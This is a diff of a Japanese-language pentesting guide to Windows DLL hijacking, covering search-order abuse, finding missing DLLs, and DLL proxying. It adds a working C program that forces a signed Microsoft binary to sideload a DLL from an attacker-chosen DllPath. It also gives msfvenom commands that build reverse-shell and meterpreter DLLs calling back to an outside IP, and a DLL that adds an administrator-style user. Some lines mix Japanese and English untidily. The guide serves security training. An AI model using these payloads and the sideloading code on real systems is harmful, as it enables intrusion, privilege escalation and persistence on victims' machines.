@@ -6,94 +6,184 @@
 
 ## 基本情報
 
-DLLハイジャックは、信頼されたアプリケーションを操作して悪意のあるDLLを読み込ませることを含みます。この用語は、**DLLスプーフィング、インジェクション、サイドローディング**などのいくつかの戦術を含みます。主にコード実行、持続性の達成、そしてあまり一般的ではない特権昇格に利用されます。ここでの昇格に焦点を当てていますが、ハイジャックの手法は目的に関係なく一貫しています。
+DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL を読み込ませるよう操作する手法です。この用語には **DLL Spoofing, Injection, and Side-Loading** のような複数の戦術が含まれます。主に code execution や persistence を目的とし、稀に privilege escalation に用いられます。ここでは escalation に注目していますが、hijacking の手法自体は目的にかかわらず基本的に同じです。
 
-### 一般的な技術
+### 一般的な手法
 
-DLLハイジャックにはいくつかの方法が使用されており、各アプリケーションのDLL読み込み戦略に応じて効果が異なります：
+DLL hijacking にはいくつかの方法があり、各手法の有効性はアプリケーションの DLL ロード戦略によって異なります:
 
-1. **DLL置換**: 本物のDLLを悪意のあるDLLと入れ替え、オプションでDLLプロキシを使用して元のDLLの機能を保持します。
-2. **DLL検索順序ハイジャック**: 悪意のあるDLLを正当なDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
-3. **ファントムDLLハイジャック**: アプリケーションが存在しない必要なDLLだと思い込んで読み込む悪意のあるDLLを作成します。
-4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
-5. **WinSxS DLL置換**: WinSxSディレクトリ内で正当なDLLを悪意のあるDLLと置き換える方法で、DLLサイドローディングに関連付けられることが多いです。
-6. **相対パスDLLハイジャック**: コピーしたアプリケーションと共にユーザーが制御するディレクトリに悪意のあるDLLを配置し、バイナリプロキシ実行技術に似ています。
+1. **DLL Replacement**: 正規の DLL を悪意あるものと差し替えます。元の DLL の機能を保持するために DLL Proxying を使用することがあります。
+2. **DLL Search Order Hijacking**: 悪意ある DLL を正規のものより先に検索されるパスに配置し、アプリケーションの検索順序を悪用します。
+3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要な DLL と誤認して読み込むような悪意ある DLL を作成します。
+4. **DLL Redirection**: %PATH% や .exe.manifest / .exe.local といった検索パラメータを変更して、アプリケーションを悪意ある DLL に向けます。
+5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意あるものと置換する手法で、DLL side-loading と関連することが多いです。
+6. **Relative Path DLL Hijacking**: コピーされたアプリケーションと同じユーザ制御のディレクトリに悪意ある DLL を置く手法で、Binary Proxy Execution に類似します。
 
-## 不足しているDLLの発見
+## 欠落している DLL の検出
 
-システム内の不足しているDLLを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**します：
+システム内で欠落している DLL を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、次の 2 つのフィルタを設定することです:
 
 ![](<../../images/image (311).png>)
 
 ![](<../../images/image (313).png>)
 
-そして**ファイルシステムアクティビティ**のみを表示します：
+そして **File System Activity** のみを表示します:
 
 ![](<../../images/image (314).png>)
 
-一般的に**不足しているdllを探している**場合は、これを**数秒間**実行します。\
-特定の実行可能ファイル内の**不足しているdllを探している**場合は、**「プロセス名」が「含む」"\<exec name>"のような別のフィルターを設定し、実行してイベントのキャプチャを停止する**必要があります。
+一般的な missing dlls を探す場合は、これを数秒間実行し続けます。特定の実行ファイル内の missing dll を探す場合は、"Process Name" "contains" "\<exec name>" のような追加フィルタを設定し、対象を実行してイベントのキャプチャを停止してください。
 
-## 不足しているDLLの悪用
+## 欠落している DLL の悪用
 
-特権を昇格させるための最良のチャンスは、**特権プロセスが読み込もうとするDLLを書くことができる**ことです。したがって、**元のDLL**があるフォルダーの前に**DLLが検索されるフォルダー**にDLLを書き込むことができるか、**DLLが検索されるフォルダー**に書き込むことができ、元の**DLLがどのフォルダーにも存在しない**場合です。
+権限昇格を狙う場合、最も有効なのは、特権プロセスが読み込もうとする DLL をそのプロセスが検索する場所のいずれかに書き込めることです。つまり、DLL が元の DLL のあるフォルダより先に検索されるフォルダに悪意ある DLL を書き込める（稀なケース）か、DLL が検索されるフォルダに書き込みができ、かつ元の DLL がどのフォルダにも存在しない場合に有効です。
 
-### DLL検索順序
+### Dll Search Order
 
-**DLLがどのように特に読み込まれるかは、[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**で確認できます。**
+**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**
 
-**Windowsアプリケーション**は、特定の順序に従って**事前定義された検索パス**に従ってDLLを探します。DLLハイジャックの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正当なDLLの前に読み込まれることを保証する場合に発生します。この問題を防ぐための解決策は、アプリケーションが必要なDLLを参照する際に絶対パスを使用することを確認することです。
+Windows アプリケーションは、あらかじめ定義された検索パスのセットに従い、特定の順序で DLL を探します。悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置すると、正規の DLL より先に読み込まれてしまい、DLL hijacking の問題が発生します。これを防ぐための対策として、アプリケーション側で必要な DLL を参照する際に絶対パスを使用することが有効です。
 
-32ビットシステムの**DLL検索順序**は以下の通りです：
+32-bit システムにおける DLL 検索順序は以下の通りです:
 
 1. アプリケーションが読み込まれたディレクトリ。
-2. システムディレクトリ。 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用してこのディレクトリのパスを取得します。(_C:\Windows\System32_)
-3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。 (_C:\Windows\System_)
-4. Windowsディレクトリ。 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用してこのディレクトリのパスを取得します。(_C:\Windows_)
-5. 現在のディレクトリ。
-6. PATH環境変数にリストされているディレクトリ。これは、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスを含まないことに注意してください。DLL検索パスを計算する際に**App Paths**キーは使用されません。
+2. システムディレクトリ。パスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
+3. 16-bit システムディレクトリ。パスを取得する関数はありませんが検索されます。(_C:\Windows\System_)
+4. Windows ディレクトリ。パスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。(_C:\Windows_)
+5. カレントディレクトリ。
+6. PATH 環境変数に列挙されたディレクトリ。これは App Paths レジストリキーで指定されたアプリケーション毎のパスを含まない点に注意してください。App Paths キーは DLL 検索パスの計算には使用されません。
 
-これは、**SafeDllSearchMode**が有効な場合の**デフォルト**の検索順序です。これが無効になると、現在のディレクトリが2番目の位置に上昇します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効です）。
+これは SafeDllSearchMode が有効な場合のデフォルトの検索順序です。無効にするとカレントディレクトリの優先度が 2 番目に上がります。この機能を無効にするには、HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode のレジストリ値を作成し、0 に設定します（デフォルトは有効）。
 
-[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD_WITH_ALTERED_SEARCH_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから始まります。
+[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** で呼ばれると、検索は LoadLibraryEx が読み込んでいる実行モジュールのディレクトリから開始されます。
 
-最後に、**DLLは名前だけでなく絶対パスを指定して読み込まれる可能性がある**ことに注意してください。その場合、そのDLLは**そのパス内でのみ検索されます**（DLLに依存関係がある場合、それらは名前で読み込まれたものとして検索されます）。
+最後に、DLL が名前だけでなく絶対パスを指定してロードされる場合があります。その場合、その DLL は指定されたパスでのみ検索されます（その DLL に依存関係がある場合、それらは名前のみで読み込まれた場合と同様に検索されます）。
 
 検索順序を変更する他の方法もありますが、ここでは説明しません。
 
-#### WindowsドキュメントからのDLL検索順序の例外
+### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath
 
-標準のDLL検索順序に対する特定の例外がWindowsのドキュメントに記載されています：
+新しく作成するプロセスの DLL 検索パスに決定的に影響を与える高度な方法のひとつは、ntdll のネイティブ API を使ってプロセスを生成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定すると、インポートされた DLL を名前で解決する（絶対パスではなく、セーフなロードフラグを使っていない）ターゲットプロセスに対して、そのディレクトリから悪意ある DLL を読み込ませることが可能になります。
 
-- **メモリに既に読み込まれているDLLと名前が同じDLL**に遭遇した場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを行い、メモリ内のDLLにデフォルトで戻ります。このシナリオでは、システムはDLLの検索を行いません。
-- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはその既知のDLLのバージョンと、その依存DLLを使用し、**検索プロセスを省略します**。レジストリキー**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが保持されています。
-- **DLLに依存関係がある場合**、これらの依存DLLの検索は、最初のDLLがフルパスで特定されたかどうかに関係なく、**モジュール名**のみで示されたかのように行われます。
+要点
+- RtlCreateProcessParametersEx でプロセスパラメータを構築し、制御下のフォルダを指すカスタム DllPath を指定します（例: dropper/unpacker が存在するディレクトリ）。
+- RtlCreateUserProcess でプロセスを作成します。ターゲットバイナリが名前で DLL を解決すると、ローダはこの DllPath を参照するため、悪意ある DLL がターゲット EXE と同じ場所に置かれていなくても確実に sideloading できます。
 
-### 特権の昇格
+注意点 / 制限事項
+- これは作成される子プロセスに影響するもので、現在のプロセスにのみ影響する SetDllDirectory とは異なります。
+- ターゲットは名前で DLL をインポートまたは LoadLibrary する必要があります（絶対パスではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していないこと）。
+- KnownDLLs やハードコードされた絶対パスはハイジャックできません。Forwarded exports や SxS によって優先順位が変わる場合があります。
 
-**要件**：
+Minimal C example (ntdll, wide strings, simplified error handling):
+```c
+#include <windows.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
 
-- **異なる特権**（水平または側方移動）で動作するか、動作するプロセスを特定し、**DLLが不足している**ことを確認します。
-- **DLL**が**検索される**任意の**ディレクトリ**に**書き込みアクセス**が可能であることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。
+// Prototype (not in winternl.h in older SDKs)
+typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
+PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+PUNICODE_STRING ImagePathName,
+PUNICODE_STRING DllPath,
+PUNICODE_STRING CurrentDirectory,
+PUNICODE_STRING CommandLine,
+PVOID Environment,
+PUNICODE_STRING WindowTitle,
+PUNICODE_STRING DesktopInfo,
+PUNICODE_STRING ShellInfo,
+PUNICODE_STRING RuntimeData,
+ULONG Flags
+);
 
-はい、要件を見つけるのは複雑です。**デフォルトでは特権のある実行可能ファイルがDLLを欠いているのを見つけるのは奇妙であり、システムパスフォルダーに書き込み権限を持つのはさらに奇妙です**（デフォルトではできません）。しかし、設定が不適切な環境ではこれは可能です。\
-運が良ければ要件を満たしている場合、[UACME](https://github.com/hfiref0x/UACME)プロジェクトを確認できます。**プロジェクトの主な目的はUACをバイパスすることですが、使用できるWindowsバージョンのDLLハイジャックの**PoC**が見つかるかもしれません（おそらく書き込み権限のあるフォルダーのパスを変更するだけで済みます）。
+typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
+PUNICODE_STRING NtImagePathName,
+ULONG Attributes,
+PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
+PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
+PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
+HANDLE ParentProcess,
+BOOLEAN InheritHandles,
+HANDLE DebugPort,
+HANDLE ExceptionPort,
+PRTL_USER_PROCESS_INFORMATION ProcessInformation
+);
 
-フォルダー内の**権限を確認する**には、次のようにします：
+static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
+DWORD n = GetModuleFileNameW(h, out, cch);
+for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
+}
+
+int wmain(void) {
+// Target Microsoft-signed, DLL-hijackable binary (example)
+const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";
+
+// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
+wchar_t dllDir[MAX_PATH];
+DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);
+
+UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
+RtlInitUnicodeString(&uImage, image);
+RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
+RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
+RtlInitUnicodeString(&uCurDir, dllDir);
+
+RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
+(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
+RtlCreateUserProcess_t pRtlCreateUserProcess =
+(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");
+
+RTL_USER_PROCESS_PARAMETERS *pp = NULL;
+NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
+NULL, NULL, NULL, NULL, NULL, 0);
+if (st < 0) return 1;
+
+RTL_USER_PROCESS_INFORMATION pi = {0};
+st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
+if (st < 0) return 1;
+
+// Resume main thread etc. if created suspended (not shown here)
+return 0;
+}
+```
+運用上の使用例
+- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
+- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
+
+この手法は実際にマルチステージのサイドローディングチェインを引き起こす事例で観測されています：最初のランチャーがヘルパー DLL を配置し、それが Microsoft-signed でハイジャック可能なバイナリをカスタム DllPath で起動して、ステージングディレクトリから攻撃者の DLL を強制的に読み込ませます。
+
+
+#### Exceptions on dll search order from Windows docs
+
+Certain exceptions to the standard DLL search order are noted in Windows documentation:
+
+- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
+- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
+- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.
+
+### 権限の昇格
+
+**要件**:
+
+- **異なる権限** (horizontal or lateral movement) の下で動作している、または動作する予定のプロセスで、**DLL が存在しない**ものを特定する。
+- **DLL が検索される**任意の**ディレクトリ**に対して**書き込みアクセス**があることを確認する。この場所は実行ファイルのディレクトリやシステムパス内のディレクトリである可能性がある。
+
+確かに要件を見つけるのは難しく、デフォルトでは特権実行ファイルが DLL を欠いていることは稀であり、システムパスのフォルダに書き込み権限があるのは通常あり得ません（デフォルトでは不可能です）。しかし、設定ミスのある環境ではこれが可能になることがあります。もし運良く要件を満たす環境を見つけたら、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してみてください。プロジェクトの主な目的は **bypass UAC** ですが、使用可能な Windows バージョン向けの **PoC**（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）が見つかるかもしれません。
+
+注意: **フォルダ内の権限を確認する**には、次を実行してください:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-すべてのフォルダーの**PATH内の権限を確認します**:
+そして、**PATH内のすべてのフォルダの権限を確認する**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-実行可能ファイルのインポートとDLLのエクスポートを確認するには、次のコマンドを使用できます:
+executable の imports と dll の exports は以下のコマンドで確認できます:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-完全なガイドについては、**Dll Hijackingを悪用して特権を昇格させる**方法を確認してください。**System Pathフォルダー**に書き込み権限がある場合は、以下を参照してください：
+For a full guide on how to **Dll Hijacking を悪用して権限を昇格する** with permissions to write in a **System Path folder** check:
+
 
 {{#ref}}
 dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
@@ -101,39 +191,39 @@ dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
 
 ### 自動化ツール
 
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダーに書き込み権限があるかどうかを確認します。\
-この脆弱性を発見するための他の興味深い自動化ツールは、**PowerSploit関数**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、および_Write-HijackDll_です。
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに書き込み権限があるかをチェックします。\
+この脆弱性を発見するための他の興味深い自動化ツールは **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll_ です。
 
 ### 例
 
-悪用可能なシナリオを見つけた場合、成功裏に悪用するための最も重要なことの1つは、**実行可能ファイルがインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。とにかく、Dll Hijackingは、[**中程度の整合性レベルから高い整合性レベルに昇格するために便利です（UACをバイパス）**](../authentication-credentials-uac-and-efs.md#uac)または[**高い整合性からSYSTEMに昇格するために**](#from-high-integrity-to-system)**役立ちます。** 有効なdllを作成する方法の例は、この実行のためのdll hijackingに焦点を当てたdll hijacking研究の中にあります：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
-さらに、**次のセクション**では、**テンプレート**として役立つ可能性のある**基本的なdllコード**や、**必要のない関数をエクスポートしたdllを作成するためのコードを見つけることができます。
+もし悪用可能なシナリオを見つけた場合、成功させるために最も重要なことの一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートする **dll を作成すること** です。なお、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) や [**High Integrity to SYSTEM**](#from-high-integrity-to-system) への昇格に便利である点に注意してください。実行目的の dll hijacking に焦点を当てたこの調査内には、**有効な dll を作成する方法** の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+さらに、**next sectio**n ではテンプレートとして役立ついくつかの **basic dll codes** や、不要な関数をエクスポートした **dll** を作成するための基本的なコード例が見つかります。
 
-## **Dllの作成とコンパイル**
+## **Dll を作成およびコンパイルする**
 
-### **Dllプロキシ化**
+### **Dll Proxifying**
 
-基本的に、**Dllプロキシ**は、**読み込まれたときに悪意のあるコードを実行することができるDll**ですが、**実際のライブラリへのすべての呼び出しを中継することによって**、**期待通りに機能する**こともできます。
+基本的に **Dll proxy** はロードされたときにあなたの悪意あるコードを **実行できる** 一方で、実際のライブラリへのすべての呼び出しを中継して期待される動作を **公開し動作する** ことができる Dll です。
 
-ツール[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実行可能ファイルを指定し、プロキシ化したいライブラリを選択して**プロキシ化されたdllを生成する**ことができます。または、**Dllを指定して**、**プロキシ化されたdllを生成する**こともできます。
+ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定してプロキシ化したいライブラリを選び **generate a proxified dll** する、あるいは Dll を指定して **generate a proxified dll** することができます。
 
 ### **Meterpreter**
 
-**Revシェルを取得（x64）：**
+**Get rev shell (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**メーターpreterを取得する (x86):**
+**meterpreter (x86)を取得する:**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**ユーザーを作成する (x86のバージョンしか見当たらなかった):**
+**ユーザーを作成する (x86、x64バージョンは見当たりませんでした):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### あなた自身の
+### Your own
 
-いくつかのケースでは、コンパイルしたDllが**被害者プロセスによってロードされるいくつかの関数をエクスポートする必要がある**ことに注意してください。これらの関数が存在しない場合、**バイナリはそれらをロードできず**、**エクスプロイトは失敗します**。
+注意: 多くの場合、コンパイルする Dll は被害者プロセスによってロードされる複数の関数を必ず **export several functions** している必要があります。これらの関数が存在しないと、**binary won't be able to load**（ロードできず）、**exploit will fail**。
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -219,6 +309,9 @@ return TRUE;
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
+
+
+- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
 
 
 {{#include ../../banners/hacktricks-training.md}}
